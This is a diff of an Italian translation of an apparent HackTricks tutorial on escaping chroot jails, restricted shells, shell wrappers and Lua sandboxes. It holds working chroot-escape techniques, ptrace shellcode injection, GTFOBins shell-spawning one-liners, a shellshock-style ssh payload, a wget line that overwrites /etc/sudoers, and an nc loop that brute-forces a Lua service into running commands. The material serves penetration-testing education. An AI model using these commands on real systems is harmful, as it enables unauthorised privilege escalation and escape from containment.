@@ -1,23 +1,25 @@
-# Uscire dalle Jail
+# Escape da Jail
+
+{{#include ../../banners/hacktricks-training.md}}
 
 ## **GTFOBins**
 
-**Cerca in** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **se puoi eseguire qualsiasi binary con la proprietà "Shell"**
+**Cerca su** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **se puoi eseguire qualsiasi binary con la proprietà "Shell"**
 
 ## Escape da Chroot
 
-Da [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): Il meccanismo chroot **non è destinato a difendere** da manomissioni intenzionali da parte di **utenti privilegiati** (**root**). Sulla maggior parte dei sistemi, i contesti chroot non si annidano correttamente e i programmi chroot **con privilegi sufficienti possono eseguire un secondo chroot per uscirne**.\
-Di solito questo significa che per uscire devi essere root all'interno del chroot.<sup>[[4]](#references)</sup>
+Da [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): Il meccanismo chroot **non è progettato per difendersi** da manomissioni intenzionali da parte di utenti **privileged** (**root**). Nella maggior parte dei sistemi, i contesti chroot non si annidano correttamente e i programmi chrooted **con privilegi sufficienti possono eseguire un secondo chroot per evadere**.\
+Di solito questo significa che per evadere devi essere root all'interno del chroot.<sup>[[4]](#references)</sup>
 
 > [!TIP]
-> Lo **strumento** [**chw00t**](https://github.com/earthquake/chw00t) è stato creato per abusare dei seguenti scenari e uscire da `chroot`.<sup>[[1]](#references)[[5]](#references)</sup>
+> Il **tool** [**chw00t**](https://github.com/earthquake/chw00t) è stato creato per abusare dei seguenti scenari e fuggire da `chroot`.<sup>[[1]](#references)[[5]](#references)</sup>
 
 ### Root + CWD
 
 > [!WARNING]
-> Se sei **root** all'interno di un chroot **puoi uscirne** creando **un altro chroot**. Questo perché 2 chroot non possono coesistere (in Linux), quindi se crei una cartella e poi **crei un nuovo chroot** su quella nuova cartella mentre **ti trovi al di fuori di essa**, ora sarai **al di fuori del nuovo chroot** e quindi ti troverai nel FS.
+> Se sei **root** all'interno di un chroot **puoi evadere** creando **un altro chroot**. Questo perché 2 chroot non possono coesistere (in Linux), quindi se crei una cartella e poi **crei un nuovo chroot** su quella nuova cartella essendo **al suo esterno**, ora ti troverai **all'esterno del nuovo chroot** e quindi sarai nella FS.
 >
-> Questo accade perché di solito chroot NON sposta la tua directory di lavoro in quella indicata, quindi puoi creare un chroot ma trovarti al di fuori di esso.<sup>[[4]](#references)[[5]](#references)</sup>
+> Questo accade perché di solito chroot NON sposta la tua directory di lavoro in quella indicata, quindi puoi creare un chroot ma rimanere al suo esterno.<sup>[[4]](#references)[[5]](#references)</sup>
 
 Di solito non troverai il binary `chroot` all'interno di una chroot jail, ma **potresti compilare, caricare ed eseguire** un binary:
 
@@ -74,10 +76,10 @@ system("/bin/bash");
 ```
 </details>
 
-### Root + fd salvato
+### Root + Saved fd
 
 > [!WARNING]
-> Questo è simile al caso precedente, ma in questo caso l'**attacker memorizza un file descriptor della directory corrente** e poi **crea il chroot in una nuova cartella**. Infine, poiché ha **accesso** a quel **FD** **all'esterno** del chroot, vi accede ed **escapes**.<sup>[[4]](#references)[[5]](#references)</sup>
+> Questo è simile al caso precedente, ma in questo caso l'**attacker memorizza un file descriptor della directory corrente** e poi **crea il chroot in una nuova cartella**. Infine, poiché ha **accesso** a quel **FD** **all'esterno** del chroot, vi accede ed **esegue l'escape**.<sup>[[4]](#references)[[5]](#references)</sup>
 
 <details>
 
@@ -112,16 +114,16 @@ chroot(".");
 > - Crea un processo figlio (fork)
 > - Crea un UDS affinché il processo padre e quello figlio possano comunicare
 > - Esegui chroot nel processo figlio in una cartella diversa
-> - Nel processo padre, crea un FD di una cartella che si trova al di fuori del nuovo chroot del processo figlio
-> - Passa quell'FD al processo figlio utilizzando l'UDS
-> - Il processo figlio esegue chdir su quell'FD e, poiché si trova al di fuori del suo chroot, evaderà dalla jail.<sup>[[5]](#references)[[6]](#references)</sup>
+> - Nel proc padre, crea un FD di una cartella che si trova al di fuori del nuovo chroot del proc figlio
+> - Passa quell'FD al processo figlio usando l'UDS
+> - Il processo figlio esegue chdir verso quell'FD e, poiché si trova al di fuori del suo chroot, evaderà dalla jail.<sup>[[5]](#references)[[6]](#references)</sup>
 
 ### Root + Mount
 
 > [!WARNING]
 >
-> - Esegui il mount del dispositivo root (/) in una directory all'interno del chroot
-> - Esegui il chroot in quella directory
+> - Monta il dispositivo root (/) in una directory all'interno del chroot
+> - Esegui chroot in quella directory
 >
 > Questo è possibile in Linux.<sup>[[5]](#references)</sup>
 
@@ -129,24 +131,24 @@ chroot(".");
 
 > [!WARNING]
 >
-> - Esegui il mount di procfs in una directory all'interno del chroot (se non è già stato fatto)
-> - Cerca un pid che abbia un riferimento root/cwd diverso, come: /proc/1/root
-> - Esegui il chroot in quel riferimento.<sup>[[4]](#references)[[5]](#references)[[7]](#references)</sup>
+> - Monta procfs in una directory all'interno del chroot (se non è già stato fatto)
+> - Cerca un pid che abbia una voce root/cwd diversa, come: /proc/1/root
+> - Esegui chroot verso quella voce.<sup>[[4]](#references)[[5]](#references)[[7]](#references)</sup>
 
 ### Root(?) + Fork
 
 > [!WARNING]
 >
-> - Crea un Fork (processo figlio), esegui il chroot in una cartella diversa più in profondità nel FS e fai CD su di essa
-> - Dal processo padre, sposta la cartella in cui si trova il processo figlio in una cartella precedente al chroot del processo figlio
-> - Questo processo figlio si troverà al di fuori del chroot.<sup>[[5]](#references)</sup>
+> - Crea un Fork (proc figlio), esegui chroot in una cartella diversa e più profonda nel FS e fai CD su di essa
+> - Dal processo padre, sposta la cartella in cui si trova il processo figlio in una cartella precedente rispetto al chroot del processo figlio
+> - Questo processo figlio si ritroverà al di fuori del chroot.<sup>[[5]](#references)</sup>
 
 ### ptrace
 
 > [!WARNING]
 >
-> - La possibilità per un processo di collegarsi con `ptrace` dipende dalle credenziali, dalle capabilities e dai moduli di sicurezza abilitati, come Yama; pertanto, il debugging tra utenti uguali potrebbe essere limitato dalla policy di sistema.<sup>[[8]](#references)</sup>
-> - Se il collegamento è consentito, potresti usare ptrace su un processo ed eseguire uno shellcode al suo interno ([vedi questo esempio](../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace)).<sup>[[5]](#references)[[8]](#references)</sup>
+> - La possibilità per un processo di collegarsi con `ptrace` dipende dalle credenziali, dalle capabilities e dai security module abilitati come Yama; pertanto, il debugging tra utenti identici può essere limitato dalle policy di sistema.<sup>[[8]](#references)</sup>
+> - Se il collegamento è consentito, puoi eseguire il ptrace di un processo ed eseguire uno shellcode al suo interno ([vedi questo esempio](../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace)).<sup>[[5]](#references)[[8]](#references)</sup>
 
 ## Bash Jails
 
@@ -173,16 +175,16 @@ echo $PATH #See the path of the executables that you can use
 PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
 echo /home/* #List directory
 ```
-### Using vim
+### Utilizzo di vim
 
 Se Vim è disponibile, imposta la sua opzione `shell` su una shell che puoi eseguire e invoca `:shell`.<sup>[[10]](#references)</sup>
 ```bash
 :set shell=/bin/sh
 :shell
 ```
-### Pager e visualizzatori della guida
+### Pagers e visualizzatori della guida
 
-Molti ambienti con restrizioni lasciano comunque disponibili **pager** o **visualizzatori della guida**. Di solito è più rapido abusarne che cercare di ricostruire `PATH`.
+Molti ambienti con restrizioni lasciano comunque disponibili **pagers** o **visualizzatori della guida**. Di solito è più rapido abusarne che tentare di ricostruire `PATH`.
 ```bash
 less /etc/hosts
 !/bin/sh
@@ -192,15 +194,15 @@ man man
 
 man '-H/bin/sh #' man
 ```
-Se `git` è disponibile, la sua opzione `--paginate` invia l'output a `less` o a `$PAGER`, cosa utile quando è disponibile un pager escape.<sup>[[9]](#references)</sup>
+Se `git` è disponibile, la sua opzione `--paginate` invia l'output a `less` o a `$PAGER`, utile quando è disponibile un pager escape.<sup>[[9]](#references)</sup>
 ```bash
 PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
 # Or: git help config
 # Then inside the pager: !/bin/sh
 ```
-### Common GTFOBins one-liners
+### One-liner comuni di GTFOBins
 
-Una volta individuati i binari raggiungibili, testa prima gli shell spawner più ovvi:
+Una volta che sai quali binari sono raggiungibili, testa prima gli shell spawner più ovvi:
 ```bash
 awk 'BEGIN {system("/bin/sh")}'
 find . -exec /bin/sh \; -quit
@@ -211,7 +213,7 @@ ssh localhost /bin/sh
 ```
 Se puoi solo **iniettare argomenti** in un comando consentito (invece di eseguirlo liberamente), controlla anche **GTFOArgs**.<sup>[[17]](#references)</sup>
 
-### Creare uno script
+### Crea script
 
 Verifica se puoi creare un file eseguibile con _/bin/bash_ come contenuto
 ```bash
@@ -227,7 +229,7 @@ ssh user@<IP> -t "/bin/sh"
 ssh user@<IP> -t "bash --noprofile -i"
 ssh user@<IP> -t "() { :; }; sh -i "
 ```
-Se `ssh` è uno dei pochi binari consentiti localmente, ricorda che può anche essere abusato come **GTFOBin**; le sue opzioni `LocalCommand` e `ProxyCommand` eseguono comandi helper configurati localmente.<sup>[[14]](#references)[[15]](#references)</sup>
+Se `ssh` è uno dei pochi binari consentiti localmente, ricorda che può essere sfruttato anche come **GTFOBin**; le sue opzioni `LocalCommand` e `ProxyCommand` eseguono comandi helper configurati localmente.<sup>[[14]](#references)[[15]](#references)</sup>
 ```bash
 ssh localhost /bin/sh
 ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
@@ -249,18 +251,18 @@ wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
 ```
 ### Wrapper di shell restricted (`git-shell`, `rssh`, `lshell`)
 
-Alcuni ambienti non inseriscono l'utente direttamente in una `rbash` normale, ma in **wrapper** come `git-shell`, `rssh` o `lshell`:
+Alcuni ambienti non forniscono una `rbash` semplice, ma dei **wrapper** come `git-shell`, `rssh` o `lshell`:
 
-- `git-shell` accetta solo comandi Git lato server e qualsiasi elemento presente all'interno di `~/git-shell-commands/`. Se quella directory esiste, esegui `help` per elencare le custom actions consentite. Se puoi **scriverci**, qualsiasi eseguibile inserito in quella directory diventa raggiungibile.<sup>[[3]](#references)</sup>
-- `rssh` / `lshell` consentono comunemente solo operazioni `scp`, `sftp`, `rsync` o in stile Git. In questi casi, concentrati prima sulle **file write primitives**: carica `authorized_keys`, un file di avvio della shell o uno script helper in una posizione scrivibile, quindi riconnettiti con `ssh -t ...`.
+- `git-shell` accetta solo comandi Git lato server, oltre a qualsiasi elemento presente in `~/git-shell-commands/`. Se quella directory esiste, esegui `help` per enumerare le custom actions consentite. Se puoi **scriverci**, qualsiasi executable inserito in quella directory diventa raggiungibile.<sup>[[3]](#references)</sup>
+- `rssh` / `lshell` consentono comunemente solo operazioni con `scp`, `sftp`, `rsync` o in stile Git. In questi casi concentrati prima sulle **file write primitives**: carica `authorized_keys`, un file di avvio della shell o uno script helper in una posizione scrivibile, quindi riconnettiti con `ssh -t ...`.
 - Se il wrapper filtra solo la command line, enumera i binary raggiungibili e poi fai pivot verso **GTFOBins / GTFOArgs**.
 
 ### Altri trucchi
 
 Controlla anche:
 
-- [**Fireshell Security - Tecniche di escaping da Restricted Linux Shell**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)
-- [**SANS - Escaping da Restricted Linux Shell**](https://www.sans.org/blog/escaping-restricted-linux-shells)
+- [**Fireshell Security - Tecniche per evadere da una Restricted Linux Shell**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)
+- [**SANS - Come evadere dalle Restricted Linux Shell**](https://www.sans.org/blog/escaping-restricted-linux-shells)
 - [**GTFOBins**](https://gtfobins.org/)
 - [**GTFOArgs**](https://gtfoargs.github.io/)
 
@@ -272,7 +274,7 @@ Controlla anche:
 
 ## Python Jails
 
-Trucchi per eseguire l'escaping dalle python jails nella pagina seguente:
+Trucchi per evadere dalle python jails nella seguente pagina:
 
 
 {{#ref}}
@@ -296,7 +298,7 @@ Usa `pairs` per enumerare una tabella di libreria.<sup>[[16]](#references)</sup>
 ```bash
 for k,v in pairs(string) do print(k,v) end
 ```
-L'ordine in cui `pairs` enumera gli indici della tabella non è specificato, quindi non fare affidamento sul fatto che una funzione specifica compaia per prima. Se devi eseguire una funzione specifica, puoi effettuare un brute force attack caricando diversi ambienti lua e chiamando la prima funzione della libreria.<sup>[[16]](#references)</sup>
+L'ordine in cui `pairs` enumera gli indici della tabella non è specificato, quindi non fare affidamento sul fatto che una determinata funzione compaia per prima. Se devi eseguire una funzione specifica, puoi effettuare un brute force attack caricando diversi ambienti lua e chiamando la prima funzione della libreria.<sup>[[16]](#references)</sup>
 ```bash
 #In this scenario you could BF the victim that is generating a new lua environment
 #for every interaction with the following line and when you are lucky
@@ -307,27 +309,27 @@ for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end
 #and "char" from string library, and the use both to execute a command
 for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
 ```
-**Ottenere una shell lua interattiva**: Se ti trovi all'interno di una shell lua limitata, puoi ottenere una nuova shell lua (e, si spera, illimitata) chiamando `debug.debug()`, che entra in una modalità interattiva.<sup>[[16]](#references)</sup>
+**Ottenere una shell lua interattiva**: Se ti trovi all'interno di una shell lua limitata, puoi ottenere una nuova shell lua (si spera illimitata) chiamando `debug.debug()`, che avvia una modalità interattiva.<sup>[[16]](#references)</sup>
 ```bash
 debug.debug()
 ```
 ## References
 
-- [1] [Chw00t: Come evadere da varie soluzioni chroot (Bucsay Balazs, talk e slide di DeepSec)](https://www.youtube.com/watch?v=UO618TeyCWo)
-- [2] [Manuale di riferimento di GNU Bash – La shell con restrizioni](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
+- [1] [Chw00t: Come evadere da varie soluzioni chroot (Bucsay Balazs, intervento e slide di DeepSec)](https://www.youtube.com/watch?v=UO618TeyCWo)
+- [2] [Manuale di riferimento di GNU Bash – La shell limitata](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
 - [3] [git-shell – Documentazione di Git](https://git-scm.com/docs/git-shell)
-- [4] [chroot(2) – pagina del manuale Linux](https://man7.org/linux/man-pages/man2/chroot.2.html)
-- [5] [chw00t – tool per l'evasione da chroot](https://github.com/earthquake/chw00t)
-- [6] [unix(7) – pagina del manuale Linux](https://man7.org/linux/man-pages/man7/unix.7.html)
-- [7] [proc_pid_root(5) – pagina del manuale Linux](https://man7.org/linux/man-pages/man5/proc_pid_root.5.html)
-- [8] [ptrace(2) – pagina del manuale Linux](https://man7.org/linux/man-pages/man2/ptrace.2.html)
+- [4] [chroot(2) – Pagina del manuale di Linux](https://man7.org/linux/man-pages/man2/chroot.2.html)
+- [5] [chw00t – tool per evadere da chroot](https://github.com/earthquake/chw00t)
+- [6] [unix(7) – Pagina del manuale di Linux](https://man7.org/linux/man-pages/man7/unix.7.html)
+- [7] [proc_pid_root(5) – Pagina del manuale di Linux](https://man7.org/linux/man-pages/man5/proc_pid_root.5.html)
+- [8] [ptrace(2) – Pagina del manuale di Linux](https://man7.org/linux/man-pages/man2/ptrace.2.html)
 - [9] [git – Documentazione di Git](https://git-scm.com/docs/git)
-- [10] [:shell – documentazione di Vim](https://vimhelp.org/various.txt.html#%3Ashell)
+- [10] [:shell – Documentazione di Vim](https://vimhelp.org/various.txt.html#%3Ashell)
 - [11] [Builtin di Bash – Manuale di riferimento di GNU Bash](https://www.gnu.org/software/bash/manual/html_node/Bash-Builtins.html)
 - [12] [Variabili di Bash – Manuale di riferimento di GNU Bash](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
 - [13] [Manuale di GNU Wget](https://www.gnu.org/software/wget/manual/wget.html)
-- [14] [ssh(1) – pagina del manuale OpenBSD](https://man.openbsd.org/ssh)
-- [15] [ssh_config(5) – pagina del manuale OpenBSD](https://man.openbsd.org/ssh_config)
+- [14] [ssh(1) – Pagina del manuale di OpenBSD](https://man.openbsd.org/ssh)
+- [15] [ssh_config(5) – Pagina del manuale di OpenBSD](https://man.openbsd.org/ssh_config)
 - [16] [Manuale di riferimento di Lua 5.4](https://www.lua.org/manual/5.4/manual.html)
-- [17] [GTFOArgs: elenco dei vettori di sfruttamento dell'iniezione degli argomenti](https://gtfoargs.github.io/)
+- [17] [GTFOArgs: Elenco dei vettori di Exploitation tramite Argument Injection](https://gtfoargs.github.io/)
 {{#include ../../banners/hacktricks-training.md}}
